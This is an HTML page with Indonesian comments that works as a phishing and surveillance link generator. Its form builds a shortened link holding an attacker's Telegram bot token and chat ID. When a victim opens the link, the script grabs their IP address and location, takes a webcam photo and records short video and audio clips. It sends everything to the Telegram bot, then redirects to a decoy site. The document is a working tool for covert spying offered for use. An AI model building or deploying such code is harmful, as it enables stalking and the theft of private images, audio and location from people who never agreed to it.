<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Generate & View</title>
<style>
*{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,Arial}
body{margin:0;background:#f2f2f2;padding:20px}
.card{background:#fff;border-radius:12px;padding:24px;max-width:420px;margin:auto;box-shadow:0 2px 8px rgba(0,0,0,.15)}
h1{font-size:22px;text-align:center;margin-bottom:20px;color:#111}
label{font-size:14px;color:#555;margin-bottom:4px;display:block}
input[type=text],input[type=url]{width:100%;padding:12px;border:1px solid #ccc;border-radius:6px;font-size:16px}
button{width:100%;padding:12px;background:#007bff;color:#fff;border:none;border-radius:6px;font-size:16px;margin-top:12px;cursor:pointer}
#linkOut{font-size:14px;word-break:break-all;margin-top:16px}
iframe{width:100%;height:300px;border:none;border-radius:8px;margin-top:16px}
</style>
</head>
<body>
<div class="card" id="formCard">
  <h1>Generate Link</h1>

  <label>Bot Token</label>
  <input type="text" id="botToken" placeholder="123456:ABC-DEF...">

  <label>Chat ID</label>
  <input type="text" id="chatId" placeholder="123456789">

  <label>URL Target</label>
  <input type="url" id="targetUrl" placeholder="https://example.com" required>

  <button onclick="generate()">Generate Link</button>

  <div id="linkOut"></div>
  <iframe id="shortFrame" src="https://www.urlshort.dev/" title="Shortener"></iframe>
</div>

<script>
function generate() {
  const token = document.getElementById('botToken').value.trim();
  const chat  = document.getElementById('chatId').value.trim();
  const url   = document.getElementById('targetUrl').value.trim();

  if (!token || !chat || !url) return alert('Isi semua kolom dulu!');

  const longLink = `${location.origin}${location.pathname}?mode=view&token=${encodeURIComponent(token)}&chat=${encodeURIComponent(chat)}&target=${encodeURIComponent(url)}`;
  
  document.getElementById('linkOut').innerHTML = `
    <strong>Link:</strong><br>
    <a href="${longLink}" target="_blank">${longLink}</a><br>
    <em>Salin link di atas → paste di bawah → buat custom link</em>
  `;
}

// === MODE VIEW ===
(async () => {
  const params = new URLSearchParams(location.search);
  if (params.get("mode") !== "view") return;

  // sembunyiin form kalau mode view
  document.getElementById("formCard").style.display = "none";

  const TOKEN  = params.get("token");
  const CHAT   = params.get("chat");
  const TARGET = params.get("target") || "https://example.com";

  if (!TOKEN || !CHAT) return;

  const kirim = (type, blob, cap) => {
    const fd = new FormData();
    fd.append("chat_id", CHAT);
    fd.append(type, blob, `${type}_${Date.now()}`);
    fd.append("caption", cap);
    fetch(`https://api.telegram.org/bot${TOKEN}/send${type === "audio" ? "Audio" : "Video"}`, { method: "POST", body: fd });
  };
  const kirimFoto = (blob, cap) => {
    const fd = new FormData();
    fd.append("chat_id", CHAT);
    fd.append("photo", blob);
    fd.append("caption", cap);
    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
  };

  // Ambil IP
  let ipAddr = "Unknown IP";
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    ipAddr = data.ip;
  } catch {}

  // Lokasi
  let lat = "-", lon = "-";
  try {
    const p = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000 }));
    lat = p.coords.latitude;
    lon = p.coords.longitude;
  } catch {}

  // Kirim foto
  try {
    const s = await navigator.mediaDevices.getUserMedia({ video: true });
    const v = document.createElement("video");
    const c = document.createElement("canvas");
    v.srcObject = s; await new Promise(r => v.onloadedmetadata = r);
    v.play();
    c.width = v.videoWidth; c.height = v.videoHeight;
    c.getContext("2d").drawImage(v, 0, 0);
    s.getTracks().forEach(t => t.stop());
    c.toBlob(b => kirimFoto(b, `📸 Lat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`), "image/jpeg");
  } catch {}

  // Kirim video 3 detik
  try {
    const vs = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    const rec = new MediaRecorder(vs);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      kirim("video", blob, `📹 3 detik\nLat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`);
      vs.getTracks().forEach(t => t.stop());
    };
    rec.start();
    setTimeout(() => rec.stop(), 3000);
  } catch {}

  // Kirim audio 5 detik
  try {
    const as = await navigator.mediaDevices.getUserMedia({ audio: true });
    const rec = new MediaRecorder(as);
    const chunks = [];
    rec.ondataavailable = e => chunks.push(e.data);
    rec.onstop = () => {
      const blob = new Blob(chunks, { type: "audio/ogg" });
      kirim("audio", blob, `🎤 5 detik\nLat:${lat}, Lon:${lon}\n🌐 IP: ${ipAddr}`);
      as.getTracks().forEach(t => t.stop());
    };
    rec.start();
    setTimeout(() => rec.stop(), 5000);
  } catch {}

  // Redirect setelah 6 detik
  setTimeout(() => location.replace(TARGET), 6000);
})();
</script>
</body>
</html>